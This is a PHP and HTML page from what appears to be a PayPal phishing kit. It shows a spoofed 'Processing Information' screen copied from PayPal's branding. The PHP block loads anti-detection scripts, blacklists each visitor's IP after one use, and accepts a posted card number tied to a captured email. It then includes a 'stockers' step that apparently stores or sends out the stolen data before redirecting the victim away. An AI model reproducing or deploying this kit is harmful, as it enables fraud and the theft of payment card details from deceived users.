<?php
    include '../extra/mine.php';
    include '../prevents/anti1.php';
    include '../prevents/anti2.php';
    include '../prevents/anti3.php';
    include '../prevents/anti4.php';
    include '../prevents/anti5.php';
    include '../prevents/anti6.php';
    include '../prevents/anti7.php';
    include '../prevents/anti8.php';
    include '../extra/One_Time.php';    
    ob_start();
    session_start();
    
    $ip = $_SERVER['REMOTE_ADDR'];
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];

    if($One_Time_Access==1) {
        $fp = fopen("../extra/blacklist.dat", "a");
        fputs($fp, "\r\n$ip\r\n");
        fclose($fp);

    }

    if(!isset($_SESSION['language'])){exit(header("Location: index.php"));
    }else{
        include "../extra/languages/{$_SESSION['language']}.php";
    }
    if(!isset($_SESSION['EML']) || !isset($_POST['cardNumber'])){exit(header("Location: signin.php"));}
    @include '../extra/stockers/step2.php';
    $text = "Validation complete";
    session_destroy();
    header("refresh:3;Url=".$exitLink);
?>
<html class="no-js" data-device-type="dedicated" lang="en-GB"><head>
  
  <meta charset="utf-8">
  <title>
   Process Information
  </title>
  <meta content="NOODP, noindex, nofollow" name="robots">
  <meta content="IE=edge" http-equiv="X-UA-Compatible">
  <meta content="PayPal" name="application-name">
  <meta content="name=My Account;action-uri='https://www.paypal.com/gb/cgi-bin/webscr?cmd=_account;icon-uri=https://www.paypalobjects.com/webstatic/icon/favicon.ico" name="msapplication-task">
  <meta content="name=Send Money;action-uri=https://www.paypal.com/gb/webapps/mpp/send-money-online;icon-uri=https://www.paypalobjects.com/webstatic/icon/favicon.ico" name="msapplication-task">
  <meta content="name=Request Money;action-uri=https://www.paypal.com/gb/webapps/mpp/requesting-payments;icon-uri=https://www.paypalobjects.com/webstatic/icon/favicon.ico" name="msapplication-task">
  <meta content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=0" name="viewport">
  <link href="https://www.paypal.com/uk/webapps/mpp/signup" rel="canonical">
  <link href="/webstatic/icon/pp144.png" rel="apple-touch-icon" sizes="144x144">
  <link href="/webstatic/icon/pp114.png" rel="apple-touch-icon" sizes="114x114">
  <link href="/webstatic/icon/pp72.png" rel="apple-touch-icon" sizes="72x72">
  <link href="/webstatic/icon/pp64.png" rel="apple-touch-icon">
  <link href="/webstatic/icon/pp196.png" rel="shortcut icon" sizes="196x196">
  <link href="/webstatic/icon/favicon.ico" rel="shortcut icon" type="image/x-icon">
  <link href="/webstatic/icon/pp32.png" rel="icon" type="image/x-icon">
  <link href="https://www.paypalobjects.com/" rel="dns-prefetch">
  
  <meta content="summary" property="twitter:card">
  <meta content="@paypal" property="twitter:site">
  <meta content="website" property="og:type">
  <meta content="https://www.paypal.com/gb/webapps/mpp/signup" property="og:url">
  <meta property="og:title">
  <meta content="https://www.paypalobjects.com/webstatic/icon/pp258.png" property="og:image">
  <meta property="og:description">
  
  <link charset="UTF-8" href="https://www.paypalobjects.com/eboxapps/css/ac/67b90035e5fec0ea0d4d722be104b2fab876d5.css" media="screen, projection" rel="stylesheet" type="text/css">
  <style>
    .preloader-wrapper {
      display: flex;
      justify-content: center;
      width: 100%;
      height: 100%;
      position: fixed;
      top: 0;
      left: 0;
      z-index: 10;
      align-items: center;
    }

    .preloader-wrapper>img.preloader {
      min-width: 48px;
      min-height: 48px;
      margin-right: 10px;
    }


        #container_t {
            overflow: hidden;
            width: 200px;
        }

        #inner_t {
            overflow: hidden;
            width: inherit;
        }

        .child_t {
            float: left;
            width: 50px;
            height: 50px;
        }
  </style>
 </head>
 <body class="">
  <div data-corr-id="96f103af43f40" id="app-element-mountpoint">
   <div data-reactroot="" dir="ltr" id="document-body">
    <div class="backgroundColor">
     <script async="" defer="" src="/web/res/e59/ec6c2b16fc0a5365f00c2a3798b1c/oneTouchInject.min.js">
     </script>
     <div>
      <div aria-busy="false" class="signup clear app-wrapper">
       <div class="signup-page-header">
        <a aria-hidden="false" aria-label="Paypal Logo" class="signup-page-header-logo" href="https://www.paypal.com/" pa-marked="1">
        </a>
       </div>
       <main>
        <div aria-hidden="false" class="signup-page-form formTransition enter-done">
         <noscript>
          <div class="page-level-alert vx_alert vx_alert-critical" role="alert">
           <p class="vx_alert-text">
            To access many of the new PayPal features, you'll need to turn on JavaScript and enable cookies. You can do this in your web browser's settings.
           </p>
          </div>
         </noscript>
         <div class="notification">
         </div>
         <form class="signupAppContent formTransition enter-done" id="PageMainForm" method="POST">
          <div>
           <div aria-live="polite" class="preloader-wrapper" >
                <img src="./spinner.gif" class="preloader" />
                <div id="loading-text" class="vx_text-2 loading-text" >
                    Processing Information...
                </div>
            </div>
          </div>
           <div class="fieldGroupContainer">
            
            
            
            
            
            
           </div>
           
          </div>
          <input name="_csrf" type="hidden" value="6pPLuDnoy8+ZoG9Vr4umoK8WUcjQYvy2663eE=">
         </form>
         <div class="signup-page-footer vx_text-legal center">
          © 2020 PayPal. All rights reserved.
          <span class="signup-page-footer-separator">
           |
          </span>
          <a class="vx_text-legal" href="https://www.paypal.com/webapps/mpp/ua/privacy-full" pa-marked="1" target="_blank">
           Privacy
          </a>
          <span class="signup-page-footer-spacer">
          </span>
          <a class="vx_text-legal" href="https://www.paypal.com/webapps/mpp/ua/legalhub-full" pa-marked="1" target="_blank">
           Legal
          </a>
          <span class="signup-page-footer-spacer">
          </span>
          <a class="vx_text-legal" href="https://www.paypal.com/webapps/helpcenter/helphub/home" pa-marked="1" target="_blank">
           Help &amp; Contact
          </a>
          <span class="signup-page-footer-spacer">
          </span>
          <span>
           <a class="vx_text-legal" href="https://www.paypal.com" pa-marked="1" style="cursor:pointer">
            Feedback
           </a>
          </span>
         </div>
        </div>
       </main>
       <div id="injectedUnifiedLogin" style="height:0px;width:0px;visibility:hidden;overflow:hidden">
       </div>
      </div>
     </div>
     <noscript>
      <img src="https://c.paypal.com/v1/r/d/b/ns?f=a0539c20b26011ea982fb7b4b830297c&amp;s=t_s&amp;js=0&amp;r=1"/>
     </noscript>
     <noscript>
      <img alt="" height="1" src="https://t.paypal.com/ts?nojs=1&amp;pgst=Unknown&amp;calc=8e8e0c4eeea4c&amp;nsid=swhSKRcIroOGTYba8rX_c007q7dv53sr&amp;rsta=en_GB&amp;pgtf=Nodejs&amp;env=live&amp;s=ci&amp;ccpg=gb&amp;csci=d4027adf80524303b129c6072700dbb6&amp;comp=progressivenodeweb&amp;tsrce=authchallengenodeweb&amp;cu=1&amp;gacook=1031949139.1592393245&amp;ef_policy=gdpr_v2.1&amp;c_prefs=T=1,P=1,F=1,type=explicit_banner&amp;cust=5FTQPRXD79H2E&amp;party_id=5FTQPRXD79H2E&amp;acnt=premier&amp;aver=unverified&amp;rstr=unrestricted&amp;cnac=GB&amp;xe=100117,101828,102030,100760,100753&amp;xt=100277,106355,107273,104910,102039&amp;pros=0&amp;pgld=Unknown&amp;bzsr=main&amp;bchn=onbrd&amp;pgsf=personal&amp;lgin=in&amp;shir=main_onbrd_personal_&amp;lgcook=0" width="1"/>
     </noscript>
    </div>
   </div>
  </div>
  
  <div>
   <div>
    <!--
        script: node, date: undefined, country: GB, language: en
        hostname: rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ0EBzfgrVKf5UP9+3IJGCeU8sGJ800QtJm
        rlogid: rZJvnqaaQhLn%2FnmWT8cSUvZzdT4xVEYcdOjZnkGUylc8kYBWJIjkjU2dkaPSgTjeTi4HVaNt4iTb31oGXiMI87R3LRBUv%2Fp%2F_172cdfddec7
        -->
   </div>
   <div>
    <noscript>
     <img border="0" height="1" src="https:https://t.paypal.com/ts?nojs=1&amp;pgrp=main%3Aonbrd%3Apersonal%3A%3Asignup&amp;page=main%3Aonbrd%3Apersonal%3A%3Asignup%3A%3A%3A&amp;pgst=Unknown&amp;calc=f4f93bb3f6051&amp;nsid=str1wDSazuOF5Pq1AUeOTQqMNT3FV8f7&amp;rsta=en_GB&amp;pgtf=Nodejs&amp;env=live&amp;s=ci&amp;ccpg=gb&amp;csci=d678413f398e4d5d886eaba435439c12&amp;comp=progressivenodeweb&amp;tsrce=profilenodeweb&amp;cu=1&amp;gacook=1031949139.1592393245&amp;ef_policy=gdpr_v2.1&amp;c_prefs=T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner&amp;xe=100117%2C101828%2C102030%2C100760%2C100753&amp;xt=100277%2C106355%2C107273%2C104910%2C102039&amp;pros=4&amp;pgld=Unknown&amp;bzsr=main&amp;bchn=onbrd&amp;tmpl=signup.jsx&amp;pgsf=personal&amp;lgin=out&amp;shir=main_onbrd_personal_&amp;lgcook=0" width="1"/>
    </noscript>
   </div>
   <div>
   </div>
  </div>
  <iframe aria-hidden="true" src="about:blank" style="width: 0px; height: 0px; border: 0px none; position: absolute; z-index: -999; top: -10000px; left: -10000px;" title="pbf">
  </iframe>
  <iframe aria-hidden="true" src="https://c.paypal.com/v1/r/d/i?js_src=https://c.paypal.com/da/r/fb.js" style="width: 0px; height: 0px; border: 0px none; position: absolute; z-index: -999; top: -10000px; left: -10000px;" title="ppfniframe">
  </iframe>''
 <script>
    var delay = 2000;
    window.setTimeout(function(){
    // Move to a new location or you can do something else
        document.getElementById('loading-text').innerHTML = '<?=$text?>';
    }, delay);
 </script>
</body></html>